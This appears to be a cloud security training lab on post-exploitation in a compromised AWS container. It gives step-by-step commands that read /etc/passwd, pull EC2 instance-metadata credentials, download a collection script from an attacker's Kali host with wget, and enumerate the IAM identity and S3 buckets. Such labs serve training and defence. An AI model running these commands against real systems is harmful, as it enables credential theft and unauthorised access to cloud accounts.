---
title: "Lab 3: Credential Theft"
weight: 3
---

With root access to the container, we will set out to achieve our main objectives, data exfiltration and lateral movement. E-Crime adversaries often prioritize credential theft as a revenue generation strategy. Credentials are sold on the dark web to assist other adversaries in establishing quick and stealthy access to specific target organizations. In general though, credential access is a way to establish persistence and widen the attack.

With reverse shell root access, we can run a couple of simple commands starting with a list of local passwords.

```shell
cat /etc/passwd
```

Next, we’ll try to access EC2 instance metadata to try to capture AWS service credentials.

```shell
curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

> [!NOTE]
> If your Metasploit session closes unexpectedly, type “run -j” at the metasploit console prompt to reconnect to the target.

![Contents of /etc/passwd and instance metadata](/static/img/lab3-1.png)

**Lateral Movement**

We will continue our attack by downloading some additional scripts that we can use to gather more information from the compromised container.

> [!NOTE]
> Using the netstat utility, you can easily find the Kali public IP by listing established HTTPS connections originating from the container.

List established outbound connections to port 443 (HTTPS)

```shell
netstat -n | grep 443
```

![Netstat output](/static/img/lab3-2.png)

_The public IP in the fifth column is the Kali IP. Strip the “:443” socket port._

_Use the Kali’s public IP stored earlier or from the netstat command above, and download the collection.sh script_

```shell
wget http://<<Kali Public IP>>/collection.sh
```

![Download the collection script](/static/img/lab3-3.png)

Having gained an initial foothold in the network, attackers will then attempt to perform privilege escalation in order to move laterally to find more valuable assets.

_Further reading: You can learn about different AWS privilege escalation methods at_ https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/ .

We can begin to determine which other AWS services and infrastructure we can access via the AWS API by examining the IAM identity associated with the compromised container. Earlier, we speculated that AWS cli tools might be installed on the container which is not a recommended practice. We can confirm that.

Identify the AWS identity principal attached to the container

```shell
aws sts get-caller-identity
```

![Discover the identity principal](/static/img/lab3-4.png)

In the IAM role (shown in the “Arn” field) we have a clue about which services we are allowed to access (i.e., “Pod S3 Access”).

Confirm access to S3 by listing the buckets

```shell
aws s3 ls
```

![Listing S3 contents](/static/img/lab3-5.png)

> [!NOTE]
> If your Metasploit session closes unexpectedly, type “run -j” at the metasploit console prompt to reconnect to the target.
